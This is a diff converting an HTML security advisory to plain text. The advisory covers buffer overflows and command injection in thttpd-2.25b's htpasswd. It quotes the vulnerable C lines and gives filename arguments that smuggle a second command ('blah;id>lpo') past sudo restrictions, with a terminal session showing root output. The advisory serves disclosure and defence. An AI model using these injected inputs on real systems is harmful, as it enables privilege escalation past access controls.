@@ -1,39 +1,33 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 <em>/
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 106&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; thttpd-2.25b htpasswd Vulnerabilities&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2006-03-04&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="http://acme.com/software/thttpd/">http://acme.com/software/thttpd/</a>"&gt;<a href="http://acme.com/software/thttpd/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://acme.com/software/thttpd/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Acme Software&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2006-03-04&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:thttpd@mail.acme.com">thttpd@mail.acme.com</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;thttpd is a simple, small, portable, fast, and secure HTTP server.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;thttpd-2.25b</em>* - Two buffer overflows and command execution in htpasswd.c. htpasswd is not installed setuid root, however in some user installations htpasswd might be executed via sudo. Exploting the above vulnerabilities would allow a non-priveledged user to circumvent sudo acls for example. &amp;lt;code c&amp;gt;
-line 189 strcpy(user,argv[2]);<br/>
-line 197 strcpy(l,line);
-</p><p>line 215&amp;amp;216:<br/>
-sprintf(command,&amp;quot;cp %s %s&amp;quot;,temp_template,argv[1]); system(command);
-&amp;lt;/code&amp;gt;
-</p><p>If perhaps sudo is being used to limit what commands a user can execute as www, you could run other commands like so:
-</p><p>sudo -u www /bin/htpasswd -c &amp;quot;blah;id&amp;gt;lpo&amp;quot; webauth sudo -u www /bin/htpasswd &amp;quot;blah;id&amp;gt;lpo&amp;quot; webauth&amp;#039;&amp;#039;
-</p><p>larry@mog:~$ sudo /bin/htpasswd -c &amp;quot;blh;id&amp;gt;lp&amp;quot; www larry@mog:~$ sudo /bin/htpasswd &amp;quot;blh;id&amp;gt;lp&amp;quot; www&amp;#039;&amp;#039;
-</p><p>Changing password for user www<br/>
-New password:<br/>
-Re-type new password:<br/>
-larry@mog:~$ cat lp<br/>
-uid=0(root) gid=0(root) groups=0(root) larry@mog:~$ sudo id
-We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things:
-</p><p>#1) Respect the privacy of others.<br/>
-#2) Think before you type.<br/>
-#3) With great power comes great responsibility.
-</p><p>Password<br/>
-Sorry, user larry is not allowed to execute &amp;#039;/usr/bin/id&amp;#039; as root on mog.&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2002-2389&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=106"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisories/thttpd-2.25b_htpasswd_problems.html">http://www.vapid.dhs.org/advisories/thttpd-2.25b_htpasswd_problems.html</a>"&gt;<a href="http://www.vapid.dhs.org/advisories/thttpd-2.25b_htpasswd_problems.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisories/thttpd-2.25b_htpasswd_problems.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 106
+Title: thttpd-2.25b htpasswd Vulnerabilities
+Author:Larry W. Cashdollar, @_larry0
+Date: 2006-03-04
+Download Site: http://acme.com/software/thttpd/
+Vendor:Acme Software
+Vendor Notified: 2006-03-04
+Vendor Contact: thttpd@mail.acme.com
+Description: thttpd is a simple, small, portable, fast, and secure HTTP server.
+Vulnerability:
+thttpd-2.25b** - Two buffer overflows and command execution in htpasswd.c.
+htpasswd is not installed setuid root, however in some user installations
+htpasswd might be executed via sudo. Exploting the above vulnerabilities would
+allow a non-priveledged user to circumvent sudo acls for example. <code c> line
+189 strcpy(user,argv[2]); line 197 strcpy(l,line); line 215&216: sprintf
+(command,"cp %s %s",temp_template,argv[1]); system(command); </code> If perhaps
+sudo is being used to limit what commands a user can execute as www, you could
+run other commands like so: sudo -u www /bin/htpasswd -c "blah;id>lpo" webauth
+sudo -u www /bin/htpasswd "blah;id>lpo" webauth'' larry@mog:~$ sudo /bin/
+htpasswd -c "blh;id>lp" www larry@mog:~$ sudo /bin/htpasswd "blh;id>lp" www''
+Changing password for user www New password: Re-type new password: larry@mog:~$
+cat lp uid=0(root) gid=0(root) groups=0(root) larry@mog:~$ sudo id We trust you
+have received the usual lecture from the local System Administrator. It usually
+boils down to these three things: #1) Respect the privacy of others. #2) Think
+before you type. #3) With great power comes great responsibility. Password
+Sorry, user larry is not allowed to execute '/usr/bin/id' as root on mog.
+CVE-2002-2389
+JSON:Export
+Exploit Code:
+   1.  
+Screen Shots:
+Advisory: http://www.vapid.dhs.org/advisories/thttpd-
+2.25b_htpasswd_problems.html
